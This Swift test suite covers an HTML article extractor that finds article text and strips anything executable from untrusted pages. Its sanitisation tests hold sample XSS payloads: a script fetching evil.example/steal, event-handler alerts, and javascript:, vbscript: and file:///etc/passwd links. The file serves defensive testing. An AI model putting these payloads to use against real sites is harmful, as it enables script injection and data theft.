import Foundation
import Testing

@testable import ReadReadSupport

/// The extractor is the one place in the app that consumes markup from a server nobody vetted, so
/// these tests split into two halves: does it find the article, and can anything executable
/// survive the trip.
@Suite("ArticleExtractor")
struct ArticleExtractorTests {

    private let base = URL(string: "https://example.com/posts/widgets")!

    /// A page shaped like the ones this feature exists for: a short feed summary, a full article on
    /// the site, and the usual furniture around it.
    private func page(articleBody: String, extra: String = "") -> String {
        """
        <!doctype html>
        <html><head>
        <title>Widgets, considered | Example</title>
        <meta property="og:title" content="Widgets, considered">
        <script>var tracker = {id: 7 < 9};</script>
        <style>.ad { display: block }</style>
        </head>
        <body>
        <header class="masthead"><h1>Example</h1></header>
        <nav><ul><li><a href="/">Home</a></li><li><a href="/about">About</a></li></ul></nav>
        <div id="page">
        <main>
        <article class="post-content">
        \(articleBody)
        </article>
        </main>
        <aside class="sidebar">
            <h2>Related</h2>
            <ul><li><a href="/a">Another post</a></li><li><a href="/b">And another</a></li></ul>
        </aside>
        \(extra)
        </div>
        <footer><p>Copyright example, all rights reserved, since forever, everywhere.</p></footer>
        </body></html>
        """
    }

    private var longBody: String {
        (1...6).map { index in
            "<p>Paragraph \(index) about widgets, their manufacture, and the people who make them, "
                + "at a length that reads like prose rather than like a caption or a label.</p>"
        }.joined()
    }

    // MARK: - Finding the article

    @Test("The article body is extracted and the furniture is not")
    func extractsArticleBody() throws {
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: longBody), baseURL: base))

        #expect(result.html.contains("Paragraph 1 about widgets"))
        #expect(result.html.contains("Paragraph 6 about widgets"))

        // Each of these is a distinct rule: element name, ARIA-ish class signal, and the
        // scoring penalty for link-dense blocks.
        #expect(!result.html.contains("Copyright example"))
        #expect(!result.html.contains("Another post"))
        #expect(!result.html.contains("About"))
    }

    @Test("The publisher's own headline is preferred over the tab title")
    func prefersOpenGraphTitle() throws {
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: longBody), baseURL: base))
        // `<title>` carries " | Example"; `og:title` is the headline without the site suffix.
        #expect(result.title == "Widgets, considered")
    }

    @Test("A comment thread longer than the article does not win")
    func commentsDoNotWin() throws {
        let comments = "<div class=\"comments\">" + (1...20).map { index in
            "<p>Comment \(index): I disagree strongly, and here is a paragraph of reasons why, "
                + "written at greater length than the article itself manages.</p>"
        }.joined() + "</div>"

        let result = try #require(
            ArticleExtractor.extract(from: page(articleBody: longBody, extra: comments), baseURL: base)
        )

        // Pure density would pick the comments: there is simply more text in them. This is what
        // the class-name signals are for.
        #expect(result.html.contains("Paragraph 1 about widgets"))
        #expect(!result.html.contains("I disagree strongly"))
    }

    @Test("An article split across sibling blocks is not truncated at the first one")
    func keepsAdjacentContent() throws {
        let split = """
        <div id="page"><div class="entry-content">
        <div class="lede">\(longBody)</div>
        <div class="body-text">\(longBody)</div>
        </div></div>
        """
        let result = try #require(ArticleExtractor.extract(from: split, baseURL: base))

        // Both halves score well; taking only the single best node would drop one of them.
        let occurrences = result.html.components(separatedBy: "Paragraph 6 about widgets").count - 1
        #expect(occurrences == 2)
    }

    @Test("A page with no article in its HTML extracts nothing rather than a stub")
    func clientRenderedPageYieldsNil() {
        let shell = """
        <!doctype html><html><head><title>App</title></head>
        <body><div id="root"></div><script src="/bundle.js"></script></body></html>
        """
        // The caller's fallback — keep showing the feed's own content — is only correct if this is
        // nil rather than an empty-ish extraction that replaces a good summary with nothing.
        #expect(ArticleExtractor.extract(from: shell, baseURL: base) == nil)
    }

    @Test("Relative URLs are resolved against the page")
    func resolvesRelativeURLs() throws {
        let body = longBody + """
        <p><a href="/other">A link</a> and <img src="../images/widget.png" alt="A widget"></p>
        """
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        // The web view is handed the article as a standalone document, so an unresolved relative
        // path would resolve against `about:blank` and load nothing.
        #expect(result.html.contains("https://example.com/other"))
        #expect(result.html.contains("https://example.com/images/widget.png"))
    }

    @Test("A lazily loaded image keeps the real file rather than its placeholder")
    func resolvesLazyImages() throws {
        let body = longBody + """
        <p><img src="data:image/gif;base64,R0lGOD" data-src="/images/real.jpg" alt="Real"></p>
        """
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))
        #expect(result.html.contains("https://example.com/images/real.jpg"))
    }

    @Test("A tracking pixel inside the article is dropped")
    func dropsTrackingPixels() throws {
        let body = longBody + "<p><img src=\"https://tracker.example/p.gif\" width=\"1\" height=\"1\"></p>"
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        // Extraction is meant to leave the page's telemetry behind; a beacon in the body would
        // otherwise be fetched the instant the pane renders.
        #expect(!result.html.contains("tracker.example"))
    }

    // MARK: - Nothing executable survives

    @Test("Scripts, styles and frames do not survive extraction")
    func dropsExecutableElements() throws {
        let body = longBody + """
        <script>fetch('https://evil.example/steal');</script>
        <iframe src="https://evil.example/frame"></iframe>
        <object data="https://evil.example/o"></object>
        <form action="https://evil.example/post"><input name="q"></form>
        <style>body { background: url(https://evil.example/s.png) }</style>
        """
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        #expect(!result.html.contains("evil.example"))
        for tag in ["<script", "<iframe", "<object", "<form", "<input", "<style"] {
            #expect(!result.html.contains(tag))
        }
    }

    @Test("Event handler and style attributes are dropped")
    func dropsDangerousAttributes() throws {
        let body = """
        <div onclick="alert(1)" style="position:fixed;top:0" class="x">\(longBody)</div>
        <p onmouseover="alert(2)">A paragraph long enough to be kept in the extracted output here.</p>
        """
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        // An allowlist, so this holds for every `on*` attribute rather than the two named here.
        #expect(!result.html.contains("onclick"))
        #expect(!result.html.contains("onmouseover"))
        #expect(!result.html.contains("style="))
        #expect(!result.html.contains("class="))
    }

    @Test("A javascript: link is stripped of its href", arguments: [
        "javascript:alert(1)",
        "JavaScript:alert(1)",
        "  javascript:alert(1)",
        "java\tscript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD4=",
        "vbscript:msgbox",
        "file:///etc/passwd",
    ])
    func stripsScriptURLs(_ href: String) throws {
        let body = longBody + "<p><a href=\"\(href)\">Click</a></p>"
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        // The link text stays — it is prose — but it must not be clickable.
        #expect(result.html.contains("Click"))
        #expect(!result.html.lowercased().contains("javascript"))
        #expect(!result.html.lowercased().contains("vbscript"))
        #expect(!result.html.contains("file://"))
        #expect(!result.html.contains("data:text/html"))
    }

    @Test("An unknown element is unwrapped rather than dropped with its text")
    func unwrapsUnknownElements() throws {
        let body = "<my-widget><p>\(String(repeating: "Prose about widgets. ", count: 20))</p></my-widget>"
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        #expect(result.html.contains("Prose about widgets."))
        #expect(!result.html.contains("my-widget"))
    }

    @Test("Text that looks like markup is escaped, not re-emitted as markup")
    func escapesTextNodes() throws {
        let body = longBody + "<p>Compare &lt;script&gt; with &amp; and 3 &lt; 5 throughout.</p>"
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        // Decoded on parse and re-escaped on serialisation, so a round trip cannot turn escaped
        // text into live markup.
        #expect(result.html.contains("&lt;script&gt;"))
        #expect(!result.html.contains("<script>"))
    }

    @Test("A reference list does not out-score the article it belongs to")
    func referenceListDoesNotWin() throws {
        // Taken from a live Wikipedia page, where the citation list beat the article body outright:
        // hundreds of items, every one of them comma-dense, all crediting the same `<ol>`. The same
        // shape appears in any "related links" rail, so it is the general case that is fixed here,
        // not the encyclopaedia.
        let references = "<ol class=\"references\">" + (1...40).map { index in
            "<li><a href=\"/r\">Author, A. (200\(index % 10)), \"A cited work, in a journal, "
                + "volume \(index), pages 1-20\", retrieved January 1, 2020.</a></li>"
        }.joined() + "</ol>"

        let result = try #require(
            ArticleExtractor.extract(from: page(articleBody: longBody + references), baseURL: base)
        )
        #expect(result.html.contains("Paragraph 1 about widgets"))
    }

    @Test("A quoted angle bracket in an attribute does not leak markup into the text")
    func attributeAngleBracketsDoNotLeak() throws {
        let body = "<div data-mw='{\"wt\":\"<code>template</code>\"}'>\(longBody)</div>"
        let result = try #require(ArticleExtractor.extract(from: page(articleBody: body), baseURL: base))

        #expect(result.html.contains("Paragraph 1 about widgets"))
        #expect(!result.html.contains("data-mw"))
        #expect(!result.html.contains("template"))
    }
}
